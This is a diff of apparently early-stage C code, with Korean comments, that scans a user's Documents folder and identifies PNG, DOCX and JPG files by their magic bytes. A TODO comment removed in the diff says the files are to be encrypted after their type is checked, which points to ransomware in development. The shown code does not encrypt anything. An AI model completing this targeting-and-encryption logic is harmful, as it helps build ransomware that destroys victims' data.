@@ -79,9 +79,9 @@ void print_directory_contents(struct directory_document* dir) {
 
 char* file_Signatures_check(unsigned char* buffer, long file_size){
 
-    char* signatures_array_alias[2] = {"png","docx"}; //구조체에 저장할 파일 시그니처 명
-    unsigned char* signatures_array[2] = {(unsigned char*)"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A", (unsigned char*)"\x50\x4B\x03\x04\x14\x00\x06\x00"}; //실제 시그니처값
-    int signature_array_value_len[2] = {8, 8}; // 시그니처값의 길이
+    char* signatures_array_alias[3] = {"png","docx", "jpg"}; //구조체에 저장할 파일 시그니처 명
+    unsigned char* signatures_array[3] = {(unsigned char*)"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A", (unsigned char*)"\x50\x4B\x03\x04\x14\x00\x06\x00", (unsigned char*)"\xFF\xD8\xFF"}; //실제 시그니처값
+    int signature_array_value_len[3] = {8, 8, 3}; // 시그니처값의 길이
 
     int signatures_array_len = sizeof(signatures_array) / sizeof(signatures_array[0]);
     
@@ -94,21 +94,22 @@ char* file_Signatures_check(unsigned char* buffer, long file_size){
             // printf("file hex value: %02x\n",buffer[j]);
             // printf("j:%d\n",j);
             // printf("i:%d\n",i);
-            if(signatures_array[i][j] == buffer[j]){
-                printf("is matching\n");
-            }
-            else{
-                printf("not matching\n");
-
+            if(signatures_array[i][j] != buffer[j]){
+                printf("not matching %s\n",signatures_array_alias[i]);
                 break;
             }
+            // else{
+            //     printf("is matching\n");
+            // }
 
             //여기까지 왔다는건 모두 매칭되었다는 뜻
-            if (j == signature_array_value_len[i]-1){                
+            if (j == signature_array_value_len[i]-1){     
+                printf("Find Signature: %s\n",signatures_array_alias[i]);           
                 return signatures_array_alias[i];
             }
+            
         }
-        printf("\n");
+        
     }
     
 
@@ -125,7 +126,7 @@ void file_binary_check(struct directory_document* dir, char* directory){
 
         char full_path[1024];
         snprintf(full_path, sizeof(full_path), "%s%s", directory, file_names);
-        printf("open file: %s\n",full_path);
+        printf("\nopen file: %s\n",full_path);
 
 
         FILE* file = fopen(full_path, "rb");
@@ -205,17 +206,13 @@ int main(){
     printf("\nTemp Directory:\n");
     //print_directory_contents(temp_dir);
 
-    // memory free 잊지말기.
-    /* 
-    TODO: 
-    파일을 하나씩 읽고, 시그니처값을 검사하여 암호화까지. 
-    메모리 할당을 한 번 해주고, 암호화가 끝나는 방식으로 해야됨.
-    모든 파일의 바이너리값을 한번에 저장하고, 시그니처를 하나씩 검사하게 된다면 메모리가 부족할거임.
-    결론: 구조체에 있는 파일을 하나씩 fread(binary로) 하고, 시그니처를 확인하여 암호화를 진행해야함.
-    */
+    
+
     file_binary_check(document_dir,"C:\\Users\\user\\Documents\\");
     printf("\nnew Document Directory:\n");
     print_directory_contents(document_dir);
 
+
+    // memory free 잊지말기.
     return 1;
 }
